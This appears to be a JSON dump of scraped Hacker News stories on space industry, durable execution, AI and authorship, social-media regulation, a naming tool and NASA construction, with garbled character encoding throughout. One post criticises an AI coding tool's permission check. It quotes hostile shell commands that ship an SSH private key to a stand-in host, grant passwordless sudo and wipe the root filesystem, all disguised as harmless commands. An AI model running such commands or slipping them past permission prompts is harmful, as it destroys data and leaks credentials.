      "content": "Physics > Popular Physics\n\nTitle:Affordable, Rapid Bootstrapping of the Space Industry and Solar System Civilization\n\nSubmission history\n\nAccess Paper:\n\nView PDF\n\nReferences & Citations\n\nNASA ADS\n\nGoogle Scholar\n\nSemantic Scholar\n\nBibTeX formatted citation\n\nBookmark\n\nBibliographic and Citation Tools\n\nCode, Data and Media Associated with this Article\n\nDemos\n\nRecommenders and Search Tools\n\nAuthor\n\nVenue\n\nInstitution\n\nTopic\n\narXivLabs: experimental projects with community collaborators\n\narXivLabs is a framework that allows collaborators to develop and share new arXiv features directly on our website.\n\nBoth individuals and organizations that work with arXivLabs have embraced and accepted our values of openness, community, excellence, and user data privacy. arXiv is committed to these values and only works with partners that adhere to them.\n\nHave an idea for a project that will add value for arXiv's community?Learn more about arXivLabs.",
      "url": "https://arxiv.org/abs/1612.03238",
      "author_username": "andsoitis",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:02.795071",
      "published_at": "2026-02-03T09:00:49",
      "scraped_at": "2026-02-03T09:03:02.795082",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46871070",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "e27cf9774c0ee58c2979fde2ad8a9693"
    },
    {
      "id": "33f8300d72c58b8999e562f03c5f5bd2",
      "source": "hackernews",
      "source_id": "46871065",
      "title": "Durable Execution",
      "content": "Weâ€™re so glad youâ€™re here. You can expect all the best TNS content to arrive \n\t\t\t\t\t\t\t\t\tMonday through Friday to keep you on top of the news and at the top of your game.\n\nCheck your inbox for a confirmation email where you can adjust your preferences \n\t\t\t\t\t\t\t\t\tand even join additional groups.\n\nFollow TNS on your favorite social media networks.\n\nBecome aTNS follower on LinkedIn.\n\nCheck outthe latest featured and trending storieswhile you wait for your \n\t\t\t\t\t\t\t\t\tfirst TNS newsletter.\n\nDurable Execution: Build reliable software in an unreliable world\n\nSoftware reliability is a persistent problem for developers because IT systems are built on unreliable components: hardware degrades; software has bugs; networks drop packets; large language models (LLMs) hallucinate; power fails.\n\nAn executing program runs to completion unless:\n\nA.The program or OS encounters a bugB.An external failure, such as a machine losing power or rebooting, occursC.Thereâ€™s a hardware failure\n\nHereâ€™s a small example that illustrates the problem.\n\nAs Iâ€™m writing this article, I have an electrician working on the fuse boards in my house, and the power has tripped multiple times. My youngest, who is at home moddingMinecraft, just lost a bunch of work when the power went out. Itâ€™s maddening, and happens because RAM is volatile and needs constant power to hold data.\n\nLosing work like this is frustrating enough at home, but imagine the aggravation on an enterprise scale, with thousands of people using the same unreliable systems.\n\nReliability through defensive code and hardware redundancy\n\nTraditionally, software engineers have tried to achieve reliability from unreliable components by using fault-tolerant hardware and by designing applications to recover from crashes and failures.\n\nCommon hardware approaches to improving reliability include RAID, network interface cards (NICs), redundant power supplies, and on higher-cost machines, hot-swappable CPUs. Disk mirroring with a two-disc array increases the mean time between failures (MTBF) since, while the individual drives still have their own limited MTBF, the array does not fail until both drives fail.\n\nHowever, asTom Wheeler, principal developer advocate atTemporal, tellsThe New Stackin an interview leading up to the companyâ€™s annual Replay conference, â€œAs you scale up and move from one server to two, 10, 100, or 1,000 servers, the possibility that any one disk could fail goes up exponentially.â€ Moreover, hardware-based approaches only protect you from hardware failures.\n\nFor software, the most common way to improve reliability is to write code defensively. Senior developers tend to write more defensive code because theyâ€™ve seen so many things go wrong.\n\nRethinking application development with Durable Execution\n\nDurable Execution encourages a different approach.\n\nDurable Execution platforms such asTemporal,AWS Lambda durable functions,Azure Durable Functions,Cadence,Cloudflare Workflows,Flawless,Inngest, andRestateensure that your application behaves correctly despite adverse conditions.\n\nThey do this by guaranteeing the application runs to completion, storing state information, and reconstructing it if it fails.\n\nAs Wheeler explains, the Temporal platform â€œcompletely reconstructs the state in a safe way following a crash. The execution continues from that point, so you donâ€™t wind up duplicating steps that had been completed successfully before the crash.â€\n\nDurable Execution doesnâ€™t do anything that you canâ€™t build yourself â€” the concepts have existed inmessaging applications since at least 1990. But doing so is challenging. Developers spend substantial time writing code to store application state in a database and to use systems such as Apache Kafka to communicate state changes to other applications. There are patterns in software development, such as thetransactional outbox patternwhich exists to address problems that can occur when those efforts fail.\n\nDurable Execution makes this unnecessary.\n\nâ€œDurable Execution is a very simple concept, but it has profound implications on the way software engineers approach development,â€ Wheeler says. â€œYou donâ€™t have to worry about a crash, in the same way that you donâ€™t have to worry about packets being dropped or delivered in the wrong order.â€\n\nâ€œWith Durable Execution, your application overcomes those problems, so you can accomplish the goal in a much simpler way.â€\n\nHe believes this changes how developers view programming. â€œDevelopers are conditioned to reduce execution times because the longer a program runs, the more likely it is to encounter problems. With Durable Execution, your application overcomes those problems, so you can accomplish the goal in a much simpler way.â€\n\nHe continued: â€œImagine that youâ€™re onboarding new users who sign up for a SaaS offeringâ€™s free tier. You need to track usage and periodically send customized upgrade offers until they cancel or subscribe to a paid tier.\n\nImplementing that might involve a scheduler, an application database, and message queues. With Durable Execution, you donâ€™t need that complexity, because time is no longer the enemy. You can implement it using a for-loop and sleep statements, with durations of days, months, or even years.â€\n\nThe mechanics of Durable Execution\n\nA Durable Execution platformâ€™s purpose is to manage state, handle retries, and ensure a sequence of tasks (often long-running) completes successfully even if the infrastructure fails. The core abstraction in Durable Execution platforms is most commonly referred to as a Workflow.\n\nA Workflow is a function that defines the sequence of steps for achieving a specific goal. For example, an e-commerce order-processing Workflow might calculate the total, charge the customerâ€™s credit card, and send a confirmation email.\n\nSteps that could behave differently between invocations â€” such as calls to external systems â€” cannot be included directly in the Workflow. Instead, they must be placed in separate functions called Activities, which are referenced in the Workflow.\n\nAt runtime, Worker processes on your application servers execute these functions. Each Worker polls the Temporal Service for tasks specifying which function to run next, then reports back. The Temporal Service records details about each task, which includes the completion status and result reported by the Worker, to an append-only log known as the Event History.\n\nIf a crash occurs, another Worker can take over, reconstruct the pre-failure state from the Event History, and resume execution.\n\nFor this replay mechanism to work correctly, Workflow code must be deterministic â€” producing the same sequence of commands given the same input. Non-deterministic operations (e.g. conditional logic involving the current time or random numbers) may cause mismatches during replay.\n\nOperations with side effects (e.g., database updates, notifications, disk or network I/O) must be wrapped in Activities. Instead of re-executing previously completed Activities during replay, the platform uses the result stored in the Event History.\n\nEven with this careful approach, there is still a slight possibility that an Activity could be executed twice. Imagine that your Activity uses a payment service to charge a customerâ€™s credit card, and a crash occurs in the milliseconds between the card being charged and the Temporal Service recording the result. The new Worker, unaware that the Activity previously completed, would execute it again.\n\nFor this reason, Activities should be idempotent so that repeated calls donâ€™t cause undesirable behavior. Most payment services, as well as many other types of third-party API, allow callers to include an idempotency key along with requests. This key enables these services to identify and ignore duplicate requests.\n\nHow Durable Execution handles persistent processing failures\n\nAny platform that allows for retries risks duplicate transactions, and Durable Execution provides no inherent support for idempotency. However, the risk is reduced because completed activities are not retried.\n\nAnother class of errors are persistent processing failures, called â€œpoison messagesâ€ in messaging applications. A poison message is one that a receiving application repeatedly fails to process â€” often due to bad data, an incorrect format, or an application bug â€” causing it to be rolled back to the queue and redelivered endlessly, potentially creating an infinite loop.\n\nThe same pattern can occur with Durable Execution, where an application crashes whenever execution reaches the last recorded event and switches to execution mode. These errors may be transient or persistent.\n\nTransient errors can usually be resolved through backoff and retry, but that technique will not fix a persistent error. For example, if a call to a payment service fails because thereâ€™s not enough money in the account, a call two seconds later will probably fail for the same reason. Temporal allows you to designate specific message types and errors as non-retriable, which helps prevent pointless retry attempts.\n\nIn the case of a non-transient poison message style error, Temporal and most other Durable Execution platforms allow developers to fix an issue in a running application, also known as â€œhotfixing.â€ Applying the hotfix involves temporarily stopping all the Workers, deploying new code, then restarting the Workers. Execution resumes exactly as it would after a crash.\n\nWheeler explains, â€œLetâ€™s say that you have an e-commerce application to which you have added some code to calculate a 10% discount for any order over $500. You have this in your workflow code, but letâ€™s say that thereâ€™s a typo, so instead of dividing by 10, you divide by zero. Thatâ€™s obviously an illegal operation, so itâ€™s going to cause a divide by zero exception (or the equivalent in the language you are using). Itâ€™s going to fail, and each time you retry, it will fail again.\n\nâ€œBut you can go in and fix the code, then redeploy the application. Since it reconstructs the state ",
      "url": "https://thenewstack.io/temporal-durable-execution-platform/",
      "author_username": "chhum",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://cdn.thenewstack.io/media/2026/02/40061e3c-sara-oliveira-6kqalppnokg-unsplash-1024x768.jpg",
          "alt": "Featued image for: Durable Execution: Build reliable software in an unreliable world"
        },
        {
          "type": "image",
          "url": "https://cdn.thenewstack.io/media/2026/02/b3f1e671-unnamed-1-1024x611.png",
          "alt": "Temporal Web UI screenshot displays running state with ChargeCustomer activity failing on third attempt due to payment service offline error. "
        },
        {
          "type": "image",
          "url": "https://cdn.thenewstack.io/media/2026/02/afbbf4dd-unnamed-2-1024x612.png",
          "alt": "Temporal Workflow after successful completion"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:02.965425",
      "published_at": "2026-02-03T09:00:18",
      "scraped_at": "2026-02-03T09:03:02.965434",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46871065",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "16654b4cfa2e3242c239d625afb1082e"
    },
    {
      "id": "880165509a9f550c1b5a0118cf9024e0",
      "source": "hackernews",
      "source_id": "46871059",
      "title": "Authentically Authoring in the Age of AI Slop",
      "content": "Authentically Authoring in the Age of AI Slop\n\nWould you like to know the first question I usually get when I tell someone that Iâ€™m an author? Really? Okayâ€¦\n\nâ€œDo you use AI?â€\n\nA few short years ago, that question would never have crossed anyoneâ€™s mind. It would be, â€œWhat do you write?â€ â€œWhere can I find your books?â€ â€œHow do you pay your bills?â€ (Um, I have a partner who loves me more than life itself, and heâ€™s generously helped me save up for the massive costs of self-publishing, cheering me on all the wayâ€¦ duh.)\n\nNow, the answer is incredibly subjective, and the reason for the question usually hinges upon what the person askingimaginesâ€˜use of AIâ€™ means. For some professions, AI tools are rapidly being implemented, costs cut, and processes streamlined. For other professions, AI poking its frigid fingers into everyoneâ€™s pies is frustrating at best, career ending at worst. For creatives, its presence can mean downright theft.\n\nWhat people donâ€™t usually include in their initial question isthe type of Artificial Intelligence they meanâ€”or even understandâ€”and how it is used in an authorâ€™s workflow (if at all).\n\nAI overviews, searches, and â€˜optimizationsâ€™ are rapidly becoming the norm, with little to no consultation of the offending platformâ€™s intentions to their users; we are not given the choice to use AI or to opt out, it simply exists. Iâ€™ve noticed that the people screaming the loudest in opposition to any [yes ANY] type of AI are shouting their opinions on social media, most of which have AI integrated into the apps themselves.\n\nWhat we need to understand is that â€˜use ofAIâ€™ does not equate to â€˜use ofgenerative AIâ€™. The most blatant offenders of the latter are AI â€˜artistsâ€™ claiming to have created a digital image through skillful direction of promptsâ€”they ignore the fact that the work of actual artists has been stolen and is being used without their consent, and without compensation. More and more lawsuits are being filed, and generative AI tools have been exposed as having scraped images on the internet/social media to train these massive models, along with video, original content, and yes, books, including pirated libraries,to churn out quick and dirty AI slop.\n\nLet us be absolutely clear:The AI models being trained on art, content, and literature that they have not legally acquired the rights to IS THEFT, plain and simple.***And Iâ€™m (purposefully) NOT getting into the argument that â€˜use of AIâ€™ has a negative impact on the environmentâ€”that subject is too nuanced for this blog post, and I know Iâ€™m not fully informed of the circumstances behind every single server complex and local watershed conditions, impact on the established population, electricity bills, etc.***\n\nDo I think that means that all AI usage is wrong? Again, specify what you mean by â€˜use of AIâ€™.\n\nIâ€™ll give you an example: My husband works for a bank. Cybersecurity is the bankâ€™s top priority. As a customer of that bank, Iâ€™d imagine that would be your top priority as well. Now think of all the ways a thief could use AI built programs, processes, or viruses to steal your hard-earned moneyâ€”money you NEED to pay your bills, feed your children, donate towards worthy causes, or even support an Indie Author (wink, wink ğŸ˜‰)\n\nIâ€™ll give you another example: One of the best-selling video game franchises in the last decade has had their original IP copied by another developer who, after requesting permission from the IPâ€™s owner to release their AI rip-off and hearing â€˜NOâ€™, continued to develop it anyways. Another AI model was able to generate almost word-for-word a significant percentage of a massively successful book, one that is ubiquitous to modern pop culture. The flimsy argument made by the owners of the AI was that this was â€˜fringe behaviorâ€™ and that their researchers were actively working to address it.\n\nMy question to you is this: Would you prefer that AInotbe used by the bankâ€™s cybersecurity teams and allow the scammers, thieves, and unscrupulous individuals easy access to your money? What about the copyrighted IPs and novels that are clearly beingstolento train generative AI models?\n\nThe impact is that the big corporations get a slap on the wrist and pay a fine, butthey still reap a windfall from all of the stolen material, while the smaller artists/authors/musicians hyperventilate if anyone even speaks the two lettersâ€œA Iâ€in their direction. Not only can they lose their creative work to these leeches,theyâ€™ll be blacklisted and boycotted if they are suspected of AI usage, whether thatâ€™s true or not. In every scenario, the little guy is getting screwed over while the ones who need no further enrichment gorge themselves on the crumbs after theyâ€™ve devoured the whole cake.\n\nThe reality of the situation is that,no matter where you stand on the issue, AI exists, and it isnâ€™t going anywhere anytime soon. Balance, while it can be difficult to find, is key. Is the artist, musician, or author with 2,000 followers on Instagram the bad guy? Do they deserve relentless bullying by others whose opinions dictate whattheyfeel is right or wrong, or to lose their living to these soulless imitations of their art?\n\nMy personal opinion is that some authors may choose to useprogramsorplatformsthat have AI features built into them, and they can utilize them or avoid them as much as they like,so long as the AI isnâ€™t â€˜creatingâ€™ anything for them(and I use that word looselyâ€”computers do not â€˜createâ€™ anything, they copy, and theyâ€™re usually poor copies at best).\n\nAll that being said,I value human creativity above all else. I pay my designer/illustrator for good quality, genre appropriate, and frankly kick-ass book covers for my novels,ALL of which are written by ME.I write for the joy of writing, to process emotions, to discover more about myself, and to understand the world around me. Why would I outsource that creative process to a computer?For myself, and for many other authors out there, we are sharing a part of ourselves, hoping to connect with readers that are looking for adventure, emotion, validation, and healing.\n\nI donâ€™t care how much training a computer gets, it lacks the thing that makes stories resonate throughout generations:\n\nthe human soul\n\nElle Rushingâ€™s debut trilogy,Native of Nowhere\n\n100% HUMAN MADE ğŸš« Gen AI (crazy, I know, even the kick-ass cover art fromMiblArt!) Click the image to start reading sample chapters forFREE!\n\n~ Indie Author and Creator of the Lucent Universe~ Sci Fi stories with heart, told through the eyes of trauma survivors~ Space opera, Sci Fi adventure, RomantaSCI (no spice romance)~ Stories featuring messages of hope, trust, self-acceptance, and healing~ Lover of all things Central Texasâ€¦ and tacosâ€¦ tacos are great!",
      "url": "https://ellerushing.com/elles-blog/authentically-authoring-ai-slop",
      "author_username": "kpinkerman",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://images.squarespace-cdn.com/content/v1/63fe78217c7f7a310de21dfc/1769809234419-WXDAISX056XPCWT4K489/NON+Stack+Placeholders.jpg",
          "alt": ""
        }
      ],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:03.667592",
      "published_at": "2026-02-03T09:00:02",
      "scraped_at": "2026-02-03T09:03:03.667614",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46871059",
        "kids_count": 1,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "bd3ed55ad1c934c9798f66f9f32eeaf8"
    },
    {
      "id": "477c74290285b550e6849f2beea0727e",
      "source": "hackernews",
      "source_id": "46871056",
      "title": "Social Media is Gambling: Let's treat it as such",
      "content": "Fine - you drove me to it. Last time I posted about this I hit the number 1\nspot on Hacker News and was (rightly) skewered for not providing a solution -\njust listing a bunch of problems. This timeâ€¦I have answers.\n\nBefore I get onto them, Iâ€™d like to thank my colleagues with whom I holidayed\n(see my previous post) and ultimately sharpened these ideas. So, letâ€™s get\nstarted - how do we set about banning (or not) social media?\n\nGuiding Principles\n\nI have absolutelyzerointerest in telling teenagers where or how they can talk to\neach other. Every generation of adults bemoans the\nconversations of their teenagers and thinks their minds are being warped. Broad\nbans of social media are toxic because of exactly this. Teacher. Leave them kids alone.\n\nThat means that Iâ€™m only going to be regulatingalgorithmic feeds. I\ndonâ€™t have evidence that theyâ€™re more harmful than the combination of\nsmartphone cameras and Instagram, or talking with your friends in an\nunregulated wayâ€¦but theyâ€™re the bit Iâ€™m most scared of so Iâ€™m starting there.\n\nI havevery littleinterest in uniquely targeting teenagers with\nregulations until evidence says that they are uniquely likely to be harmed by\nsocial media. Therefore, any regulations thathitprotect teenagers are going to have\nto come with some bonus new regulation for adults.\n\nI strongly believe that any approach must be:\n\nGradual- I canâ€™t abide the thought of dropping a 16/18 year old with no\nexperience of social media whatsoever into the bull pen that is a\nstate-of-the-art algorithmic feed. That seems so obviously wrong as to be\nlaughable. Itâ€™s also the currently proposed approach where I live.\n\nPractical- I canâ€™t abide calls to â€œregulate the algorithmsâ€ without any\ndegree of specificity. Think like you work at a tech company (I do) and make\nconcrete suggestions that could actually be implemented.\n\nRight, with that out of the way, letâ€™s begin with ~8 year olds.\n\nYoung Children\n\nThe simple answer would be to ban algorithmic feeds for young children, but\nthat doesnâ€™t sound practical (is â€˜most popularâ€™ algorithmic?) or gradual (an outright ban never is). Letâ€™s start by defanging the feeds a little.\n\nI state that for children under the age of 11, any â€˜feedâ€™ of content can\nonly use geography, language, time and age as features. No personalisation. No more\ngranular features. Any feed will ultimately have to wring whatever signal it\ncan out of the most popular/recent content for your geography, language and age.\n\nWhat constitutes an algorithmic feed? Any content chosen to be displayed. News\napps, social feeds, Spotifyâ€™s homepageâ€¦anywhere where an algorithm (of which\nâ€˜most popularâ€™ is one, â€˜most recentâ€™ is another) is determining which content to show a user.\n\nI dislike regulation that only applies to certain apps/surfaces/company sizes -\nare we trying to protect children or are we trying to hamstring incumbents?\nThis is universally applicable.\n\nNote that Iâ€™m fine with â€˜per-surfaceâ€™ popularity or recency - you can show the most\npopular sport stories in the â€˜sportâ€™ subsection, and the most popular weather\nstories in the â€˜weatherâ€™ subsection. But no working out whether a specific 10 year old\nis more interested in sport or weather and tailoring their homepage to reflect\nthat. But you can work out whatall10 year olds are into and have their\nhomepage reflect that.\n\nOlder Children\n\nGiven how Iâ€™ve stated my opening gambit for younger children, and the\nprinciples Iâ€™ve laid out, I think you can tell what Iâ€™m going to say for older\nchildren.\n\nWeâ€™re gradually going to allow more and more demographic features to be used.\nSelf-reported gender (which, as any data scientist will tell you, is gold for\nrecommendations), local geography, stated choice (self-selection of topics of\ninterest)â€¦ultimately weâ€™re introducing\nmore and more features to allow for better and better recommendations in any\ncontent feed.\n\nIsnâ€™t that making their algorithmic feeds stickier and stickier,\npotentially leading to more and more harm? Maybe.\n\nBut remember - as soon as they hit $AGE_OF_CONSENT$ theyâ€™re going to be hit with the\nfull-force of personalised algorithmically curated feeds that are designed to\ncircumvent the decision-making part of their brain and go straight to the automatic\nresponse system.\n\nIt might sound scary when I lay it out like this, but the alternative\nisâ€¦well, what? At some point weâ€™re going to expose people to the full force\nof state-of-the-art algorithmic feeds. The least we can do is let them build\ntowards it gradually.\n\nI havenâ€™t specified which ages certain features become available. I can if you\nwant, but really thatâ€™s the kind of detail Iâ€™d expect to be put together in\nconjunction with tech companies with graphs of the extra recommendation power\nyou get per demographic feature.\n\nFor Everybody\n\nLast time I argued (by symmetry, and possibly poorly) that you shouldnâ€™t ban social media for children without\nregulating the experience for adults. I drew analogies to the gambling\nindustries and Iâ€™d like to do so again.\n\nGambling offers repeated reminders that you should be having fun, it allows you\nto set time and monetary limits, and it shows you how much you have spent.\n\nUsing the age old maxim that time = money, does the fact that algorithmic feeds\nspend your time rather than your money absolve them of those responsibilities?\nCurrently, yes. But Iâ€™d argue that algorithmic feeds should come with exactly\nthe same set of controls.\n\nâ€œYou have spent 22 hours this week scrollingâ€\n\nâ€œYou only have 15 minutes left on your 4 hour daily limitâ€\n\nâ€œWould you like to set a time limit?â€\n\nâ€œYour usage is up by 17% this week compared to last week. Would you like to\ntake a break?â€\n\nNone of that sounds especially onerous and could all be comfortably\nimplemented in relatively little time by companies operating algorithmic feeds.\nThe only reason that they havenâ€™t is that they havenâ€™t been required to. Of\ncourse, all of these controls would be available to children (and their\nparents).\n\nDownsides\n\nIâ€™m making the experience of using algorithmic feeds worse for everybody (in\nthe short-term, at least). Rather than seeing content that works perfectly for\nyou, youâ€™re seeing the average content that works for everybody.\n\nIâ€™m killing a bunch of businesses - and potentially communities. Anybody who\nrequires finding a niche is going to have a greatly reduced ability to do so.\n\nI donâ€™t really have any concrete proof that algorithmic feeds are (especially)\nbad for teens and yet theyâ€™ll be the ones to bear the brunt of this regulation.\nYou could argue that we have to act based on the precautionary principle. I\ndonâ€™t know that I agree, but Iâ€™d rather see this regulation than an outright\nban.\n\nChildren will probably still spend hours on end on â€˜social mediaâ€™, and will\nstruggle with all the things that children and teenagers have struggled with\nfor years (belonging, identity, group dynamics). Thereâ€™s no regulation that\nwill fix â€œbeing a teenagerâ€ and nor should there be.\n\nMessaging is deliberately left wholly untouched - if we must intervene here\n(and maybe we have to - I acknowledge that the power to talk with children\nacross the world in a wholly private manner is a new capability that previous\ngenerations didnâ€™t need to wrestle with) then we should do so in a targeted and\npurposeful way.\n\nThis proposal requires social media companies to have some notion of the age of\nits users. There areseriousprivacy concerns that will come with this\nrequirement. We are currently in the throes of bungling those privacy concerns\nin the UK.\n\nConclusion\n\nIâ€™ve proposed an implementable and impactful set of regulations for social\nmedia.\n\nI think it avoids a lot of the problems with a â€œban on social media for\nunder-16sâ€ that is currently (?) making its way through the Lords. But I still\nthink it offers protection for teenagers as they find their feet in the world.\n\nI also think it equates algorithmic feeds and gambling in an entirely sensible\nway.\n\nWhat do you think?",
      "url": "https://dogdogfish.com/blog/2026/01/28/social-media-gambling/",
      "author_username": "matthewsharpe3",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:04.139953",
      "published_at": "2026-02-03T08:59:47",
      "scraped_at": "2026-02-03T09:03:04.139979",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46871056",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "a37593cae7192f19a8dd7fd898954b81"
    },
    {
      "id": "a7aa6dcda885750da53614c3f14a38db",
      "source": "hackernews",
      "source_id": "46871055",
      "title": "Show HN: Using sound symbolism and multi-agent AI to generate brand names",
      "content": "Your AI business name generator shouldn't give youâ€˜SmartBiz Proâ€™.Again.\n\nGeneric business name generators produce the same forgettable startup names for everyone. Your company deserves a name that stands out.\n\nSound familiar?\n\nEvery founder hits this wall.\n\nâ€œMy competitor has the same name suggestionâ€\n\nâ€œIt sounds like every other startupâ€\n\nâ€œEvery .com I check is already takenâ€\n\nâ€œNobody can remember itâ€\n\nâ€œIt describes what we do... so does everyone else'sâ€\n\nâ€œI've been at this for 3 hoursâ€\n\nThere's a reason professional naming agencies charge$50,000+\n\nGenerate brand names that make peopleuncomfortable.That's the point.\n\nGreat names feel weird at first. That discomfort is the signal you've found something distinctive enough to own.\n\nGeneric vs. Distinctive\n\nOur methodology combines:\n\nDescribe your business to generate unique name ideas.\n\nFree to generate â€¢$5to unlock all 10 names â€¢ 100% money-back guarantee\n\nHow Our AI Business Name Generator Works\n\nProfessional naming methodology powered by multi-agent AI to create distinctive, memorable brand names with domain and trademark checks.\n\nDescribe Your Business\n\nTell us what your business does and how you want customers to feel. Focus on experience, not features.\n\nMulti-Agent Discovery\n\nMultiple AI agents analyze your business from different creative perspectives, uncovering unique naming angles.\n\nLinguistic Analysis\n\nNames are evaluated for sound symbolism, phonetic impact, and cognitive fluency based on proven research.\n\nFinal Synthesis\n\nWe select the best 10 names ranked by boldness, distinctiveness, and experience potential â€” each screened against the USPTO trademark database.\n\nWhat is a Business Name Generator?\n\nA business name generator is an AI-powered tool that creates distinctive brand names based on your business description. Unlike generic AI that repeats common patterns(Adjective + Noun + Pro/Hub/Plus), Vibelo uses multi-agent analysis to generate names based on sound symbolism, phonetic impact, and cognitive fluencyâ€”the same principles professional naming agencies charge $50,000+ to apply.\n\nThe Generator Advantage\n\nHow Vibelo Compares\n\nWhy professional naming methodology shouldn't cost $50,000.\n\nSame science.Fraction of the cost.\n\nI was skeptical. 'AI naming tools' usually spit out garbage. This gave me a name that made meuncomfortable at first- and that's exactly why I knew it was right.\n\nSarah K.\n\nFounder, Consumer Tech Startup\n\nWe spent $2,000 on a branding agency who gave us 'EcoFlow Solutions'. This gave us something we actually use for$5.\n\nMarcus T.\n\nCEO, Climate Tech\n\nThe name we picked made our investors pause. Then smile. Then write abigger check. Distinctive names get attention.\n\nLisa M.\n\nSeries A Founder\n\nReady to find your business name?\n\nTry our free AI business name generator.$5to unlock all 10 names.100% money-back guarantee.\n\nFrequently Asked Questions\n\nEverything you need to know about naming your business with Vibelo.\n\nHow do I name my business?\n\nFollow these 4 steps: (1) Describe what your business does and the experience you create for customers. (2) Generate names using multiple creative perspectives. Multiple AI agents analyze your business from different anglesâ€”emotional, functional, competitive. (3) Evaluate names for linguistic quality: sound symbolism (how sounds create meaning), phonetic impact (how memorable they are), and cognitive fluency (how easy they are to remember). (4) Select the name that feels right while standing out from competitors. Great names feel slightly uncomfortable at firstâ€”that discomfort signals distinctiveness.\n\nGetting Started\n\nWhat makes a good business name?\n\nHow is Vibelo different from ChatGPT?\n\nCan I use Vibelo for free?\n\nHow is Vibelo better than a naming agency?\n\nWhat methodology does Vibelo use?\n\nHow many names does Vibelo generate?\n\nWhat if I don't like any of the names?\n\nStill have questions? Our names speak for themselves.",
      "url": "https://vibelo.ai",
      "author_username": "leanzubrezki",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:04.510913",
      "published_at": "2026-02-03T08:59:35",
      "scraped_at": "2026-02-03T09:03:04.510928",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46871055",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "74a098687a79e599a8cc1c54a168999b"
    },
    {
      "id": "55e9959ce97e07e0dd120fad157b7b1c",
      "source": "hackernews",
      "source_id": "46871054",
      "title": "Anthropic, you need a shell parser",
      "content": "sh\n\nllm\n\nAnthropic. Claude. Bro.\n\nThis is not ahugo configcommand.\n\nIsecho 'cat /root/.ssh/id_ed25519' | ssh productionlol.example.com sh -c 'cat - >/tmp/runme.sh; sh /tmp/runme.sh'an â€œecho commandâ€?\n\nIsgrep '127.0.0.1' /etc/hosts | sed 's/127\\.0\\.0\\.1.*localhost.*/myaccount ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoersa â€œgrep commandâ€??\n\nIsyes | sudo rm -rf /a â€œyes commandâ€!?!?\n\nThis, from the company thatâ€™s supposed to save us from superpersuasion.",
      "url": "https://me.micahrl.com/blog/anthropic-you-need-a-shell-parser/",
      "author_username": "speckx",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://me.micahrl.com/ogimage/equation_ogimage_template_hu_b128ebf3fc5fce28.png",
          "alt": "og:image"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:05.214163",
      "published_at": "2026-02-03T08:59:34",
      "scraped_at": "2026-02-03T09:03:05.214176",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46871054",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "fc368c3edde52379c56d8cc694610a0d"
    },
    {
      "id": "ca90185ff328625b44014ceee0b71602",
      "source": "hackernews",
      "source_id": "46871053",
      "title": "NASA Enables Construction Technology for Moon and Mars Exploration",
      "content": "5 min read\n\nNASA Enables Construction Technology for Moon and Mars Exploration\n\nLoura Hall\n\nOne of the keys to a sustainable human presence on distant worlds is using local, or in-situ, resources which includes building materials for infrastructure such as habitats, radiation shielding, roads, and rocket launch and landing pads. NASAâ€™s Space Technology Mission Directorate is leveraging its portfolio of programs and industry opportunities to develop in-situ, resource capabilities to help future Moon and Mars explorers build what they need. These technologies have made exciting progress for space applications as well as some impacts right here on Earth.\n\nThe Moon to Mars Planetary Autonomous Construction Technology (MMPACT) project, funded by NASAâ€™s Game Changing Development program and managed at the agencyâ€™s Marshall Space Flight Center in Huntsville, Alabama, is exploring applications of large-scale, robotic 3D printing technology for construction on other planets. It sounds like the stuff of science fiction, but demonstrations using simulated lunar and Martian surface material, known as regolith, show the concept could become reality.\n\nWith its partners in industry and academic institutions, MMPACT is developing processing technologies for lunar and Martian construction materials. The binders for these materials, including water, could be extracted from the local regolith to reduce launch mass. The regolith itself is used as the aggregate, or granular material, for these concretes. NASA has evaluated these materials for decades, initially working with large-scale 3D printing pioneer, Dr. Behrokh Khoshnevis, a professor of civil, environmental and astronautical engineering at the University of Southern California in Los Angeles.\n\nKhoshnevis developed techniques for large-scale extraterrestrial 3D printing under the NASA Innovative Advanced Concepts (NIAC) program. One of these processes 